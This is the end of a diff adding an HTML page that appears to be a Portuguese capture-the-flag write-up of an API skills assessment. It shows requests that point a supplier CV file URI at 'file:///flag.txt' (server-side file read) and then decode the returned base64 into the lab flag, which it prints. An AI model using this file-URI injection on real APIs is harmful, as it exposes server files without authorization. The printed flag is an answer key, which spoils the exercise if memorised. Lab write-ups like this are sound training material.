+    <pre><span class="lang-label">bash</span><code># 1. Upload de PDF legítimo
+POST /api/v2/suppliers/current-user/cv
+
+# 2. Atualiza o URI para apontar para a flag
+PATCH /api/v2/suppliers/current-user
+{"ProfessionalCVPDFFileURI": "file:///flag.txt", ...}
+
+# 3. Lê o arquivo via endpoint de CV
+GET /api/v2/suppliers/current-user/cv
+{"base64Data": "SFRCe2YxOTBiODBjZDU0M2E4NGIyMzZlOTJhMDdhOWQ4ZDU5fQo="}</code></pre>
+
+    <figure><img src="api-attack-imgs/skills-img4.png" alt="SSRF apontando para flag.txt" /></figure>
+    <figure><img src="api-attack-imgs/skills-img5.png" alt="Resposta com base64 da flag" /></figure>
+
+    <pre><span class="lang-label">bash</span><code>$ echo SFRCe2YxOTBiODBjZDU0M2E4NGIyMzZlOTJhMDdhOWQ4ZDU5fQo= | base64 -d
+HTB{f190b80cd543a84b236e92a07a9d8d59}</code></pre>
+
+    <figure><img src="api-attack-imgs/skills-img6.png" alt="Flag decodificada" /></figure>
+
+    <div class="callout-flag">
+      <div class="cf-title">🚩 Skills Assessment — Flag</div>
+      <p><code>HTB{f190b80cd543a84b236e92a07a9d8d59}</code></p>
+    </div>
+
+  </div>
+
+  <footer>
+    <div><span class="status-dot"></span>fstringuetta.github.io</div>
+    <span>© 2026 · fstringuetta</span>
+  </footer>
+
+</div>
+
+<script>
+  const sections = document.querySelectorAll('.wu-content h2[id]');
+  const tocLinks = document.querySelectorAll('.toc a');
+  const tocObserver = new IntersectionObserver(entries => {
+    entries.forEach(e => {
+      if (e.isIntersecting) {
+        tocLinks.forEach(l => l.classList.remove('active'));
+        const active = document.querySelector(`.toc a[href="#${e.target.id}"]`);
+        if (active) active.classList.add('active');
+      }
+    });
+  }, { rootMargin: '-10% 0px -80% 0px' });
+  sections.forEach(s => tocObserver.observe(s));
+
+  document.addEventListener('mousemove', e => {
+    const x = (e.clientX / window.innerWidth - 0.5) * 14;
+    const y = (e.clientY / window.innerHeight - 0.5) * 14;
+    document.querySelector('.grid-bg').style.transform = `translate(${x}px, ${y}px)`;
+  });
+</script>
+</body>
+</html>
